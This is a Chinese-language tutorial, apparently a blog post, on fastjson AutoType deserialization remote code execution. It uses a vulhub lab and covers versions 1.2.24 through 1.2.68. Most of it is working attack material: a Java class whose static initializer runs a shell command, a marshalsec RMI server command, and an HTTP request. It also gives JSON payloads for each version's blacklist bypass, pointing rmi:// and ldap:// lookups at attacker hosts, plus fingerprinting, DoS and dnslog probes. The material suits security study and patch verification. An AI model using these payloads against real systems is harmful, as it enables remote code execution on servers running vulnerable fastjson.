fastjson是阿里巴巴的一个开源的JSON解析库。通常被用于将json和java object之间进行转换。

他比其他json库都快，但是带来的是更多的漏洞。其实fastjson中的漏洞还是其中的`AutoType`有关：

  * fastjson引入了AutoType，即在序列化的时候，把 **原始类型** 记录下来。（基于属性）

# 1.2.24-rec

我们先举一个最开始的漏洞来理解这个漏洞，之后的漏洞无非是在这个上面将一些恶意类或其他字符加入黑名单  
我们使用vulhub来演示

首先先编译一下执行的代码

    
    
    // javac poc.java
    import java.lang.Runtime;
    import java.lang.Process;
    
    public class poc {
        static {
            try {
                Runtime rt = Runtime.getRuntime();
                String[] commands = {"/bin/bash", "-c", "ping 88s1yo.dnslog.wiki"};
                Process pc = rt.exec(commands);
                pc.waitFor();
            } catch (Exception e) {
                // do nothing
            }
        }
    }
    

将poc.class上传至服务器。  
然后我们还需使用`marshalsec-0.0.3-SNAPSHOT-all.jar`启动一个RMI服务器

  * RMI，用官方的话来说：RMI 应用程序通常包括两个独立的程序，一个服务器和一个客户端。典型的服务器程序创建一些远程对象，使这些对象的引用可访问，并等待客户端调用这些对象上的方法。典型的客户端程序获取对服务器上一个或多个远程对象的远程引用，然后调用它们的方法。RMI 提供了服务器和客户端通信和来回传递信息的机制。这种应用程序有时被称为分布式对象应用程序。

  * 通俗易懂的来说，RMI就是`一个机器 执行 另一个机器 给的命令，但是执行的命令是不会显的`

  *  **首先我们使用python搭建一个简易的服务器：（默认开启8000端口）**

    
    
    python3 -m http.server 
    

  * **所以我们这里需要启动一个RMI服务器让靶机来访问RMI来执行命令**

    
    
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://xx.xx.xx.xx:8000/#poc" 9999
    

  * 注意这里使用的是`java -cp`而不是Java -jar。

  * 我们解压jar包，META-INF文件夹下都有 **MANIFEST.MF** ，在MANIFEST.MF中会有一个Main-Class，他是指定入口。如果你的MANIFEST.MF文件中没有Main-Class，就会提示Cant load main-class之类的错误。

  * 所以这里使用`-cp`执行，指定marshalsec.jndi.RMIRefServer

向靶场服务器发送Payload，带上RMI的地址：

    
    
    POST / HTTP/1.1
    Host: 127.0.0.1:8090
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/json
    Content-Length: 160
    
    {
        "b":{
            "@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":"rmi://xx.x.xx.xx:9999/poc",
            "autoCommit":true
        }
    }
    

这里解释一下：

> 前面说过，fastjson序列化的时候，把 **原始类型** 记录下来
>
> 序列化后的字符串中添加@type属性，存放对象类型
>
> 首先我们找到需要调用的类`com.sun.rowset.JdbcRowSetImpl`，这个类一定会被加载
>
> 被攻击的服务器拿到这个恶意的数据就找rmi服务器去执行命令
>
> 这个rmi服务器相当于请求8000端口服务器中的poc.class
>
> 从rmi请求中得到命令`ping 88s1yo.dnslog.wiki`
>
> 然后被攻击的服务器就回去执行命令

整个过程可以用以下流程图表示  
![](https://image.3001.net/images/20210607/1622996411_60bcf5bbd15c9221b97f6.png!small)

>  **所以说fastjson的漏洞核心就是可以加载任意类，所以在之后的版本中就是一直在完善黑名单**

#### 从`1.2.45`开始，fastjson默认关闭了autotype，并且加入了checkAutotype检测机制

设置了黑名单，如果ClassName命中黑名单，程序则直接抛出异常：  
autoType is not support.  
![](https://image.3001.net/images/20210607/1622996412_60bcf5bcec007168d5617.png!small)

* * *

# 1.2.41-rce

fastjson在加载到过程中，会在加载类的时候去掉className`前面的L`和最`后的;`，所以就有了如下的poc：

    
    
    {
        "b":{
            "@type":"Lcom.sun.rowset.JdbcRowSetImpl;",
            "dataSourceName":"rmi://xx.x.xx.xx:9999/poc",
            "autoCommit":true
        }
    }
    

(autoTypeSupport属性为true才能使用)

* * *

# 1.2.42-rce

由于上一个版本只只过滤了`L`和`;`，所以又可以通过双写绕过

    
    
    {
        "b":{
            "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
            "dataSourceName":"rmi://xx.x.xx.xx:9999/poc",
            "autoCommit":true
        }
    }
    

值得一提的是在此版本之后fastjson为了防止安全研究人员分析黑名单中的利用链，把黑名单从原本明文的形式改为了哈希过的黑名单，目的还是为了提高利用的门槛，但是还是有牛人跑出了大部分的包名：  
<https://github.com/LeadroyaL/fastjson-blacklist>

* * *

# 1.2.43-rce

上一个版本中双写L和; 被绕过，所有又增加了一个是否以LL未开头判断，绕过的方法是在`目标类前面添加[`  
poc:

    
    
    {
        "b":{
            "@type":"[com.sun.rowset.JdbcRowSetImpl"[,{
            "dataSourceName":"rmi://xx.x.xx.xx:9999/poc",
            "autoCommit":true
        }
    }
    

* * *

# 1.2.45-rce

这次使用了新的Gadget绕过黑名单，但是需要在目标服务器上存在mybatis包，版本大于3.0.1且小于3.4.6  
poc:

    
    
    {
        "b":{
        "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
        "properties":{
        "data_source":"rmi://xx.x.xx.xx:9999/poc"
        }
    }
    

* * *

# 1.2.47-rce

  * `1.2.33 ≤ Fastjson版本 ≤ 1.2.47`，是否开启setAutoTypeSupport都能成功

  * `1.2.25 ≤ Fastjson版本 ≤ 1.2.32`，关闭setAutoTypeSupport能成功

  * fastjson cache为true

因为来fastjson中有一个全局缓存，在类加载的时候，

  1. 如果autoType没开启，会先尝试从mapping缓存中获取目标类，如果缓存中有，则直接返回进入之后的反序列化流程。

  2. 如果autoType开启，因为typeName为`java.lang.Class`不在黑名单，成功绕过检测被解析为Class类型。

`java.lang.Class`在缓存中肯定有，该类对应的deserializer为MiscCodec，反序列化时会取json串中的val值并加载这个val对应的类Class到全局缓存中。

poc:

    
    
    {
        "a": {
            "@type": "java.lang.Class", 
            "val": "com.sun.rowset.JdbcRowSetImpl"
        }, 
        "b": {
            "@type": "com.sun.rowset.JdbcRowSetImpl", 
            "dataSourceName": "rmi://xx.x.xx.xx:9999/poc", 
            "autoCommit": true
        }
    }
    

* * *

# 1.2.62-rce

这次又有人找到了新的Gedget绕过了黑名单。  
utxName可控，造成JNDI注入

poc:

    
    
    {
    	"b": {
    		 "@type":"org.apache.xbean.propertyeditor.JndiConverter",
    		 "AsText":"rmi://xx.x.xx.xx:9999/poc"
    	}
    }
    

* * *

# 1.2.66-rce

又又又找到了新的Gadget绕过黑名单  
poc:

    
    
    {
    	"b": {
       		"@type":"org.apache.shiro.jndi.JndiObjectFactory",
        	"resourceName":"ldap://192.168.80.1:1389/Calc"
    	}
    }
    
    
    
    {
    	"b": {
        	"@type":"br.com.anteros.dbcp.AnterosDBCPConfig",
        	"metricRegistry":"ldap://192.168.80.1:1389/Calc"
    	}
    }
    
    
    
    {
    	"b": {
       		"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
        	"resourceName":"ldap://192.168.80.1:1389/Calc"
    	}
    }
    
    
    
    {
    	"b": {
        	"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",
        	"properties":{
            	"@type":"java.util.Properties",
            	"UserTransaction":"ldap://192.168.80.1:1399/Calc"
        			}
    	}
    }
    

# 1.2.68

在1.2.68之后的版本，在1.2.68版本中，fastjson增加了safeMode的支持。safeMode打开后，完全禁用autoType。

只要设置@type类型，想反序列化指定类对象的时候，就会抛异常。

(待补充)

* * *

# 判断是否使用fastjson

### 不闭合花括号判断

一般利用报错判断，例如可以`不闭合花括号`的方式来进行报错回显，在报错中往往fastjson的字段  
![](https://image.3001.net/images/20210607/1622996413_60bcf5bdcd981d7eeaf38.png!small)

## 区别fastjson和jackson

由于Jackson相对比较严格，它会相纸key与javabean属性对其，只能少不能多key，所以提交`{"name":"S",
"age":21,"agsbdkjada__ss_d":123}`时，jackson会报错，而Fastjson不会报错。  
![](https://image.3001.net/images/20210607/1622996414_60bcf5bec059942d3f9a3.png!small)

## DOS漏洞

当字符串中包含`\x`转移字符时可能会引发OOM(Out Of Memory内存溢出)的问题  
![](https://image.3001.net/images/20210607/1622996415_60bcf5bfa7266121ac0e9.png!small)

## 使用Dnslog判断

 **方法一：利用java.net.Inet[4|6]Address地址**  
`{"@type":"java.net.Inet4Address","val":"dnslog"}`  
`{"@type":"java.net.Inet6Address","val":"dnslog"}`

**![](https://image.3001.net/images/20210607/1622996417_60bcf5c1186d29e23aa41.png!small)**

 **方法二：利用java.net.InetSocketAddress**  
`{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}`

![](https://image.3001.net/images/20210607/1622996418_60bcf5c28677d7960a9da.png!small)

 **方法三：利用java.net.URL**

`{{"@type":"java.net.URL","val":"http://dnslog"}:"x"}`

